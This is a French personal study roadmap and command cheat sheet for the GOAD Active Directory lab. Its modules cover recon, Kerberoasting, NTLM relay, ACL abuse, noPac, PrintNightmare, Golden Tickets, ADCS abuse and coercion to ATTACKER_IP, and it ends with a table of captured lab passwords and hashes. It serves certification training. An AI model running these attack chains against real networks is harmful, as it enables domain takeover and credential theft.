# GOAD — Learning Path & Révision Certifs
HikenRoot Forge | hik3nR00t | Mars 2026

---

## RÈGLE D'OR
Un module = Une technique = Un write-up GitHub
Suivre mayfly277 Part 1→14 dans l'ordre — ne pas sauter

---

## TABLEAU DE BORD — Où j'en suis

### FAIT ✅
- SC-AD-001 : Recon & Initial Foothold (Part 1+2)
- SC-AD-002 : Credential Harvesting (Part 2+3)
- SC-AD-003 : NTLM Relay & Poisoning (Part 4)
- SC-AD-004 : ACL Abuse Chain (Part 11)
- SC-AD-005 : Privesc — noPac + PrintNightmare (Part 5+8)
- SC-AD-006 : MSSQL Pivot (Part 7)

### PROCHAIN ❌
SC-AD-007 : Kerberos Delegation (Part 10)

---

## ORDRE DE TRAVAIL (ne pas dévier)

1. SC-AD-007 — Kerberos Delegation [Part 10]
2. SC-AD-009 — Domain Dominance [Part 9+11]
3. SC-AD-008 — ADCS Attacks [Part 6]
4. SC-AD-010 — Cross-Forest Trusts [Part 12]
5. SC-AD-011 — Coerce & File-based [Part 13]
6. SC-AD-012 — ADCS Avancé [Part 14]

---

## MODULES DÉTAILLÉS

---

### SC-AD-001 — Recon & Initial Foothold ✅
**Mayfly Part :** 1+2 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Cartographier l'environnement AD sans credentials.

**TECHNIQUES**
- nmap service scan
- netexec smb — netbios, signing, SMBv1
- enum4linux-ng — users, shares, password policy
- LDAP anonyme — users, groups
- BloodHound collect (netexec bloodhound)
- DNS enumeration

**COMMANDES CLÉS**
```bash
netexec smb 192.168.10.0/24
netexec smb 192.168.10.0/24 --users
netexec smb 192.168.10.0/24 --shares
netexec ldap 192.168.10.11 -u '' -p '' --users
netexec smb 192.168.10.0/24 -M bloodhound
```

**RÉSULTAT GOAD**
- 5 machines : KINGSLANDING, WINTERFELL, MEEREEN, CASTELBLACK, BRAAVOS
- 3 domaines : sevenkingdoms.local, north.sevenkingdoms.local, essos.local
- CASTELBLACK + BRAAVOS signing:False → cibles relay

**MITRE ATT&CK :** T1046, T1087.002, T1018

---

### SC-AD-002 — Credential Harvesting ✅
**Mayfly Part :** 2+3 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Obtenir des credentials valides sans interaction utilisateur.

**TECHNIQUES**
- Password in LDAP description
- Password in SYSVOL scripts
- GPP encrypted passwords (SYSVOL)
- AS-REP Roasting (comptes sans pré-auth)
- Kerberoasting (comptes avec SPN)
- Password Spray

**COMMANDES CLÉS**
```bash
# LDAP description
netexec ldap 192.168.10.11 -u '' -p '' -M get-desc-users

# AS-REP Roasting
impacket-GetNPUsers north.sevenkingdoms.local/ -dc-ip 192.168.10.11 -no-pass -usersfile users.txt

# Kerberoasting
impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11 -request

# Password Spray
netexec smb 192.168.10.11 -u users.txt -p passwords.txt --no-bruteforce
```

**CREDENTIALS OBTENUS**
| Compte | Domaine | Source |
|--------|---------|--------|
| samwell.tarly | north | LDAP desc |
| brandon.stark | north | AS-REP crack |
| hodor:hodor | north | Password Spray |
| jon.snow | north | Kerberoast crack |
| jeor.mormont | north | SYSVOL script |
| tywin.lannister:powerkingftw135 | sevenkingdoms | LDAP desc |
| missandei:fr3edom | essos | AS-REP crack |
| viserys.targaryen:GoldCrown | essos | Kerberoast crack |

**MITRE ATT&CK :** T1110.003, T1558.003, T1558.004, T1552.006

---

### SC-AD-003 — NTLM Relay & Poisoning ✅
**Mayfly Part :** 4 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Capturer et relayer des hashes NTLM via empoisonnement réseau.

**TECHNIQUES**
- LLMNR/NBT-NS Poisoning (Responder)
- NTLM Relay (ntlmrelayx)
- mitm6 (IPv6 poisoning)
- Bots GOAD : robb.stark (3min) + eddard.stark (5min)

**COMMANDES CLÉS**
```bash
# Responder
sudo responder -I eth0 -wf

# ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Targets signing:False
echo "192.168.10.22" > targets.txt  # CASTELBLACK
echo "192.168.10.23" >> targets.txt # BRAAVOS
```

**RÉSULTAT**
- Hash NTLMv2 robb.stark capturé → cracké
- Hash NTLMv2 eddard.stark → relay → shell CASTELBLACK
- Admin local CASTELBLACK + BRAAVOS

**MITRE ATT&CK :** T1557.001, T1040

---

### SC-AD-004 — ACL Abuse Chain ✅
**Mayfly Part :** 11 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Exploiter des ACL mal configurées pour escalader jusqu'à Domain Admin.

**CHAÎNE SEVENKINGDOMS**
```
tywin.lannister → ForceChangePassword → jaime.lannister ✅
jaime.lannister → GenericWrite → joffrey.baratheon (Targeted Kerberoast) ✅
joffrey.baratheon → WriteDACL → tyrion.lannister ✅
tyrion.lannister → Self-Membership → Small Council ✅
(via lord.varys) → Domain Admins ✅
```

**COMMANDES CLÉS**
```bash
# ForceChangePassword
bloodyAD -d sevenkingdoms.local -u 'tywin.lannister' -p 'powerkingftw135' --host 192.168.10.10 set password 'jaime.lannister' 'Hacked123!'

# Targeted Kerberoasting via GenericWrite
bloodyAD -d sevenkingdoms.local -u 'jaime.lannister' -p 'Hacked123!' --host 192.168.10.10 set object 'joffrey.baratheon' 'servicePrincipalName' -v 'MSSQLSvc/pwned.sevenkingdoms.local:1433'
impacket-GetUserSPNs sevenkingdoms.local/jaime.lannister:'Hacked123!' -dc-ip 192.168.10.10 -request -outputfile joffrey_tgs.txt
```

**MITRE ATT&CK :** T1484.001, T1558.003

---

### SC-AD-005 — Privesc locale & domaine ✅
**Mayfly Part :** 5+8 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Escalader depuis user standard vers SYSTEM / Domain Admin.

**TECHNIQUES**
- SamAccountName Impersonation (CVE-2021-42278 + CVE-2021-42287 / noPac) ✅
- PrintNightmare (CVE-2021-1675) ✅
- KrbRelayUp ❌ (non fait)
- IIS WebShell upload CASTELBLACK ❌ (non fait)

**RÉSULTATS**
- noPac → Domain Admin north.sevenkingdoms.local — DCSync complet (krbtgt + Administrator)
- PrintNightmare → Domain Admin essos.local — DCSync complet (20 hashes)

**COMMANDES CLÉS**
```bash
# noPac — chaîne manuelle
netexec ldap 192.168.10.11 -u hodor -p hodor -d north.sevenkingdoms.local -M maq
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Password123!' -dc-ip 192.168.10.11 north.sevenkingdoms.local/hodor:hodor
bloodyAD -d north.sevenkingdoms.local -u hodor -p hodor --host 192.168.10.11 set object 'PWNED$' sAMAccountName -v 'WINTERFELL'
impacket-getTGT -dc-ip 192.168.10.11 north.sevenkingdoms.local/WINTERFELL:'Password123!'
bloodyAD -d north.sevenkingdoms.local -u hodor -p hodor --host 192.168.10.11 set object 'WINTERFELL' sAMAccountName -v 'PWNED$'
export KRB5CCNAME=WINTERFELL.ccache
python3 /opt_test/impacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 192.168.10.11 'north.sevenkingdoms.local/WINTERFELL'
export KRB5CCNAME='administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache'
impacket-secretsdump -k -no-pass -dc-ip 192.168.10.11 @'winterfell.north.sevenkingdoms.local'

# PrintNightmare — MEEREEN (DC essos WS2016)
netexec smb 192.168.10.12 -u jorah.mormont -p 'H0nnor!' -d essos.local -M spooler
x86_64-w64-mingw32-gcc -shared -o /tmp/pnightmare.dll /tmp/adduser.c -lnetapi32
sudo impacket-smbserver ATTACKERSHARE /tmp -smb2support
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@192.168.10.12 '\\10.10.10.2\ATTACKERSHARE\pnightmare.dll'
netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local --ntds
```

> **Note impacket** : getST v0.14 bugué avec -force-forwardable. Utiliser /opt_test/impacket/examples/getST.py avec -self et -altservice.

**MITRE ATT&CK :** T1068, T1190, T1003.006

---

### SC-AD-006 — MSSQL Pivot ✅
**Mayfly Part :** 7 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Pivoter via MSSQL linked servers pour obtenir RCE inter-domaines.

**CHAÎNE**
```
samwell.tarly → CASTELBLACK (sa via impersonate) ✅
arya.stark → CASTELBLACK (dbo via execute as user) ✅
CASTELBLACK → BRAAVOS (linked server, jon.snow → sa) ✅
BRAAVOS xp_cmdshell → RCE ✅
```

**COMMANDES CLÉS**
```bash
impacket-mssqlclient north.sevenkingdoms.local/samwell.tarly:PASSWORD@192.168.10.22
SQL> enum_impersonate
SQL> exec_as_login sa
SQL> enum_links
SQL> use_link BRAAVOS
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

**MITRE ATT&CK :** T1210, T1021.002

---

### SC-AD-007 — Kerberos Delegation ❌ PROCHAIN
**Mayfly Part :** 10 | **Certifs :** CRTP, CRTO, CRTE

**OBJECTIF** : Abuser des délégations Kerberos pour usurper l'identité d'admin.

**TECHNIQUES**
- Unconstrained Delegation — capture TGT
- Constrained Delegation S4U2Self + S4U2Proxy → impersonate DA
- RBCD — Resource-Based Constrained Delegation
- Shadow Credentials — msDS-KeyCredentialLink

**COMMANDES CLÉS**
```bash
# Trouver machines avec délégation
impacket-findDelegation north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11

# Constrained — S4U2Proxy
impacket-getST -spn cifs/WINTERFELL.north.sevenkingdoms.local north.sevenkingdoms.local/jon.snow -impersonate administrator -dc-ip 192.168.10.11

# RBCD
impacket-rbcd -action write -delegate-from 'ATTACKER$' -delegate-to 'CASTELBLACK$' north.sevenkingdoms.local/samwell.tarly:PASSWORD
```

**MITRE ATT&CK :** T1558.001, T1550.003

---

### SC-AD-008 — ADCS Attacks ❌
**Mayfly Part :** 6 | **Certifs :** CRTE

**OBJECTIF** : Exploiter Active Directory Certificate Services pour obtenir DA.

**TECHNIQUES**
- ESC1 : Template ENROLLEE_SUPPLIES_SUBJECT + enroll rights
- ESC4 : GenericAll sur template → modifier → ESC1
- ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 sur CA
- ESC8 : NTLM relay vers web enrollment → cert DC → DCSync
- Certifried (CVE-2022-26923)

**COMMANDES CLÉS**
```bash
certipy find -u 'missandei@essos.local' -p 'fr3edom' -dc-ip 192.168.10.12 -stdout
certipy req -u 'missandei@essos.local' -p 'fr3edom' -ca ESSOS-CA -template VulnTemplate -upn 'administrator@essos.local'
impacket-ntlmrelayx -t 'http://192.168.10.23/certsrv/certfnsh.asp' -smb2support --adcs --template DomainController
```

**MITRE ATT&CK :** T1649, T1558

---

### SC-AD-009 — Domain Dominance ❌
**Mayfly Part :** 9+11 | **Certifs :** CRTP, CRTO

**OBJECTIF** : Maintenir l'accès et atteindre la persistance post-DA.

**TECHNIQUES**
- DCSync — extraction NTDS.dit
- Golden Ticket — TGT forgé avec krbtgt hash
- Silver Ticket — TGS forgé pour service spécifique
- AdminSDHolder — persistance ACL sur groupes protégés
- DSRM account — backdoor DC local admin

**COMMANDES CLÉS**
```bash
# DCSync
impacket-secretsdump -just-dc sevenkingdoms.local/administrator@192.168.10.10 -hashes :NTLM_HASH

# Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain sevenkingdoms.local administrator
export KRB5CCNAME=administrator.ccache

# Silver Ticket
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain sevenkingdoms.local -spn cifs/KINGSLANDING administrator
```

**MITRE ATT&CK :** T1003.006, T1558.001, T1558.002

---

### SC-AD-010 — Cross-Forest Trusts ❌
**Mayfly Part :** 12 | **Certifs :** CRTO, CRTE

**OBJECTIF** : Pivoter entre forêts via les relations de confiance.

**TRUSTS GOAD**
```
north.sevenkingdoms.local ↔ sevenkingdoms.local (parent-child)
sevenkingdoms.local ↔ essos.local (cross-forest)
```

**COMMANDES CLÉS**
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11
impacket-ticketer -nthash TRUST_KEY -domain-sid NORTH_SID -domain north.sevenkingdoms.local -extra-sid SEVENKINGDOMS_DA_SID administrator
```

**MITRE ATT&CK :** T1482, T1550.003

---

### SC-AD-011 — Coerce & File-based ❌
**Mayfly Part :** 13 | **Certifs :** CRTO

**OBJECTIF** : Forcer des authentifications NTLM via fichiers malveillants et coercion.

**TECHNIQUES**
- .searchConnector-ms — déclenche WebClient
- PetitPotam (coerce DC)
- PrinterBug / SpoolSample
- WebDAV + NTLM relay

**COMMANDES CLÉS**
```bash
python3 PetitPotam.py -u '' -p '' ATTACKER_IP 192.168.10.10
python3 printerbug.py sevenkingdoms.local/tywin.lannister:powerkingftw135@192.168.10.10 ATTACKER_IP
netexec smb 192.168.10.22 -u 'samwell.tarly' -p PASSWORD -M drop-sc -o SHARE=all URL=\\ATTACKER_IP\share
```

**MITRE ATT&CK :** T1187, T1557

---

### SC-AD-012 — ADCS Avancé ❌
**Mayfly Part :** 14 | **Certifs :** CRTE

**OBJECTIF** : Exploiter les vulnérabilités ADCS avancées (ESC5 à ESC15).

**TECHNIQUES**
- ESC5 : Child-to-parent via PKI Object Control
- ESC7 : CA Officer privilege abuse
- ESC9/ESC10 : StrongCertificateBindingEnforcement bypass
- ESC11 : ICPR relay (non-HTTP)
- ESC13 : Universal group membership in certificate
- ESC14 : AltSecurityIdentities mapping

**COMMANDES CLÉS**
```bash
certipy-merged find -u 'viserys.targaryen@essos.local' -p 'GoldCrown' -dc-ip 192.168.10.12 -stdout
certipy ca -u 'viserys.targaryen@essos.local' -p 'GoldCrown' -ca ESSOS-CA -add-officer viserys.targaryen -dc-ip 192.168.10.12
```

**MITRE ATT&CK :** T1649

---

## INFRASTRUCTURE GOAD — RÉFÉRENCE RAPIDE

| Machine | IP | Domaine | Signing | SMBv1 | Rôle |
|---------|-----|---------|---------|-------|------|
| KINGSLANDING | 192.168.10.10 | sevenkingdoms.local | True | ❌ | DC01 |
| WINTERFELL | 192.168.10.11 | north.sevenkingdoms.local | True | ❌ | DC02 |
| MEEREEN | 192.168.10.12 | essos.local | True | ✅ | DC03 |
| CASTELBLACK | 192.168.10.22 | north.sevenkingdoms.local | **False** | ❌ | SRV MSSQL+IIS |
| BRAAVOS | 192.168.10.23 | essos.local | **False** | ✅ | SRV MSSQL |

**BOTS ACTIFS**
- robb.stark : connexion SMB toutes les 3 minutes
- eddard.stark : connexion SMB toutes les 5 minutes

---

## CREDENTIALS GOAD — État complet

| Compte | Mot de passe / Hash | Domaine | Source | Statut |
|--------|---------------------|---------|--------|--------|
| samwell.tarly | Heartsbane | north | LDAP desc (SC-AD-001) | ✅ |
| jeor.mormont | _L0ngCl@w_ | north | SYSVOL (SC-AD-001) | ✅ |
| tywin.lannister | powerkingftw135 | sevenkingdoms | LDAP desc (SC-AD-001) | ✅ |
| brandon.stark | iseedeadpeople | north | AS-REP (SC-AD-002) | ✅ |
| missandei | fr3edom | essos | AS-REP (SC-AD-002) | ✅ |
| jon.snow | iknownothing | north | Kerberoast (SC-AD-002) | ✅ |
| sql_svc | YouWillNotKerboroast1ngMeeeeee | essos | Kerberoast (SC-AD-002) | ✅ |
| viserys.targaryen | GoldCrown | essos | Kerberoast (SC-AD-002) | ✅ |
| hodor | hodor | north | Spray (SC-AD-002) | ✅ |
| jaime.lannister | Hacked123! | sevenkingdoms | ACL (SC-AD-004) | ✅ |
| robb.stark | sexywolfy | north | LSA dump (SC-AD-005 noPac) | ✅ |
| Administrator (north) | dbd13e1c4e338284ac4e9874f7de6ef4 | north | DCSync noPac (SC-AD-005) | ✅ |
| krbtgt (north) | 5883cbf00ea968b503b20628fb83cc55 | north | DCSync noPac (SC-AD-005) | ✅ |
| Administrator (essos) | 54296a48cd30259cc88095373cec24da | essos | DCSync PrintNightmare (SC-AD-005) | ✅ |
| krbtgt (essos) | 1d8956cac33793f4d9f14f67eb40ec2a | essos | DCSync PrintNightmare (SC-AD-005) | ✅ |
| jorah.mormont | H0nnor! | essos | SC-AD-006 MSSQL | ✅ |
| Administrator (BRAAVOS local) | ba5fa75e6a4c5da5ff2d682a94793abb | BRAAVOS | SAM dump (SC-AD-006) | ✅ |

---

## LIENS RAPIDES

| Ressource | URL |
|-----------|-----|
| GitHub AD Lab | https://github.com/hikenroot/hikenroot-forge/tree/main/docs/labs/ad-lab |
| Mayfly277 GOAD Blog | https://mayfly277.github.io |
| GOAD Source | https://github.com/Orange-Cyberdefense/GOAD |
| CRTP Syllabus | https://www.alteredsecurity.com/adlab |
| CRTO Syllabus | https://www.zeropointsecurity.co.uk/course/red-team-ops |
| CRTE Syllabus | https://www.alteredsecurity.com/redteamlab |
| HackTricks AD | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology |
| ired.team | https://www.ired.team |

---

*Auteur : hik3nR00t | HikenRoot Forge | Mars 2026*
*Dernière mise à jour : 02 mars 2026*
